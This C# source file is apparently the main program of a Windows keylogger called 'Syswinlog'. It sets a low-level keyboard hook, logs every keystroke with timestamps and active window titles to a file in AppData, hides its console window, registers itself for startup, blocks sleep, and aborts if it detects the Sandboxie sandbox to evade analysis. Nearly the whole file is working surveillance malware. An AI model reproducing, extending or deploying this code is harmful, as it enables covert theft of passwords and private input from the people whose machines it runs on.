using System;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Timers;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using Syswinlog.Classes.NativeMethods;
using Syswinlog.Classes.Constants;
using Syswinlog.Classes.Startup;
using Syswinlog.Classes.HostInfo;
using Syswinlog.Classes.StatusLog;

namespace Syswinlog
{
    class Program
    {
        public static void Main(string[] args)
        {
            if ( Utils.IsInstanceRunning() ) {
                StatusLog.Log("A running instance is already present! [ABORTING]");
                Environment.Exit(2);
            }
            if ( Utils.DetectSandboxie() ) {
                StatusLog.Log("Sandboxie detected! [ABORTING]");
                Environment.Exit(2);
            }

            Startup.Init();
            StatusLog.Log("Started...");
            Utils.PreventSleep();

            _activeWindowTextManager = new ActiveWindowTextManager();
            _activeWindowTextManager.Run();

            _hookptr = SetHook(_proc);
            SetConsoleWindow(Constants.ConsoleWindowState.SW_HIDE);

            Application.Run();
            NativeMethods.UnhookWindowsHookEx(_hookptr);
        }

        public class ActiveWindowTextManager
        {
            private static StringBuilder _activeWindow = new StringBuilder();
            public void Run()
            {
                new Thread(() => {
                    while( true ) {
                        _activeWindow = Utils.GetActiveWindowTitle();
                        Thread.Sleep(200);
                    }
                }).Start();
            }

            public StringBuilder activeWindow
            {
                get {
                    return _activeWindow;
                }
            }
        }

        public static IntPtr SetHook(NativeMethods.LowLevelKeyboardProc keyboardCallback)
        {
            using (Process proc = Process.GetCurrentProcess()) {
                using (var procModule = proc.MainModule) {
                    return NativeMethods.SetWindowsHookEx(
                        Constants.whl_keyboard_ll, keyboardCallback, NativeMethods.GetModuleHandle(procModule.ModuleName), 0
                    );
                }
            }
        }

        public static IntPtr KeyBoardProcCallback(int ncode, IntPtr wParam, IntPtr lParam)
        {
            if( ncode == 0 ) {
                if( wParam == (IntPtr) Constants.wm_keydown ) {
                    int vkey = Marshal.ReadInt32(lParam);
                    char key = Char.ToLower(Convert.ToChar( NativeMethods.MapVirtualKey((uint)vkey, Constants.mapvk_to_char) ));
                    DispatchKey(key, vkey, PrintableKey(vkey));
                }
            }
            return NativeMethods.CallNextHookEx(_hookptr, ncode, wParam, lParam);
        }

        public static char ApplyKeyShiftModifier(char key) {
            return KeyMap.keymap.ContainsKey(key) ? KeyMap.keymap[key] : Char.ToUpper(key);
        }

        public static bool PrintableKey(int vkey) {
            return !KeyMap.nonPrintableKeys.Contains(vkey);
        }

        public static void DispatchKey(char key, int vkey, bool isPrintable)
        {
            uppercase = (NativeMethods.GetKeyState(0x14) & 0xffff) != 0;

            if ((NativeMethods.GetKeyState(0xA0) & 0x8000) != 0 ||
                (NativeMethods.GetKeyState(0xA1) & 0x8000) != 0) {
                uppercase = !uppercase;
            }

            StringBuilder _internal = new StringBuilder();
            OnActiveWindowChange(delegate () {
                _internal.Append(
                    $"\n\r[{DateTime.Now.ToShortTimeString()}] [{_activeWindowTextManager.activeWindow}]\n=====\n"
                );
            });

            if ( isPrintable ) {
                key = (uppercase) ? ApplyKeyShiftModifier(key) : key;
                _internal.Append(key);
            } else {
                _internal.Append( "[" + ((Keys)vkey) + "]" );
            }

            using (_outfile = new StreamWriter(
                Utils.GetAppDataFolder() + Constants.KeyLogPath, true, Encoding.Unicode) ) {
                _outfile.Write(_internal);
            }
        }

        public static void OnActiveWindowChange(ActiveWindowCallback callback)
        {
            if (!_currentActiveWindow.Equals(_activeWindowTextManager.activeWindow)) {
                _currentActiveWindow  = _activeWindowTextManager.activeWindow;
                callback();
            }
        }

        public static void SetConsoleWindow(Constants.ConsoleWindowState state)
        {
            var handle = NativeMethods.GetConsoleWindow();
            if (handle != IntPtr.Zero) {
                NativeMethods.ShowWindow(handle, (int)state);
            }
        }

        #region variable declarations
        private static IntPtr _hookptr = IntPtr.Zero;
        private static readonly NativeMethods.LowLevelKeyboardProc _proc = KeyBoardProcCallback;
        private static bool uppercase;
        private static StreamWriter _outfile;
        private static StringBuilder _currentActiveWindow = new StringBuilder();
        //private static HostInfo hostInfo;
        private static ActiveWindowTextManager _activeWindowTextManager;
        public delegate void ActiveWindowCallback();
        #endregion
    }
}
